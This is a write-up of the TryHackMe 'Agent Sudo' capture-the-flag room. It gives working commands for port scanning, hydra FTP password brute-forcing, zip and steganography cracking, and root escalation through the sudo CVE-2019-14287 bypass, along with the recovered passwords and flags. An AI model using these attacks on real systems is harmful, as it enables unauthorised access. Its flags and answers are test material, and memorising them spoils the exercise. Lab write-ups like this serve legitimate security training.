---
description: 'https://tryhackme.com/room/agentsudoctf'
---

# Agent Sudo

## INIT

```text
export agentsudo=10.10.172.140
ping $agentsudo

echo "10.10.172.140 agentsudo.thm" >> /etc/hosts
```

## Task 2 Enumerate

```text
nmap -v -sC -sV -O -T5 -p1-65535 agentsudo.thm
```

### How many open ports?

![](../.gitbook/assets/image%20%28451%29.png)

{% hint style="success" %}
3
{% endhint %}

### How you redirect yourself to a secret page?

![](../.gitbook/assets/image%20%28438%29.png)

> Switch User-Agent to C

![](../.gitbook/assets/image%20%28401%29.png)

{% hint style="success" %}
User-Agent
{% endhint %}

### What is the agent name?

{% hint style="success" %}
Chris
{% endhint %}

## Task 3 Hash cracking and brute-force

### FTP password

```text
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://agentsudo.thm -t 50
```

![](../.gitbook/assets/image%20%28406%29.png)

{% hint style="success" %}
crystal
{% endhint %}

### Zip file password 

![](../.gitbook/assets/image%20%28389%29.png)

```text
binwalk -e cutie.png

zip2john 8702.zip > ziphash.txt
john ziphash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![](../.gitbook/assets/image%20%28381%29.png)

{% hint style="success" %}
alien
{% endhint %}

### steg password 

```text
steghide extract -sf cute-alien.jpg
```

![](../.gitbook/assets/image%20%28422%29.png)

{% hint style="success" %}
Area51
{% endhint %}

### Who is the other agent \(in full name\)? 

{% hint style="success" %}
james
{% endhint %}

### SSH password

{% hint style="success" %}
hackerrules!
{% endhint %}

## Task 4 Capture the user flag

### What is the user flag?

![](../.gitbook/assets/image%20%28404%29.png)

{% hint style="success" %}
b03d975e8c92a7c04146cfa7a5a313c7
{% endhint %}

### What is the incident of the photo called?

```text
scp james@agentsudo.thm:/home/james/Alien_autospy.jpg .
```

![](../.gitbook/assets/image%20%28407%29.png)

{% hint style="success" %}
Roswell Alien Autopsy
{% endhint %}

## Task 5 Privilege escalation

```text
sudo -l
```

![](../.gitbook/assets/image%20%28437%29.png)

### CVE number for the escalation 

![](../.gitbook/assets/image%20%28383%29.png)

![](../.gitbook/assets/image%20%28442%29.png)

{% hint style="success" %}
CVE-2019-14287
{% endhint %}

### What is the root flag? 

```text
sudo -u#-1 /bin/bash
cat /root/root.txt
```

{% hint style="success" %}
b53a02f55b57d4439e3341834d70c062
{% endhint %}

### \(Bonus\) Who is Agent R?

![](../.gitbook/assets/image%20%28396%29.png)

{% hint style="success" %}
DesKel
{% endhint %}

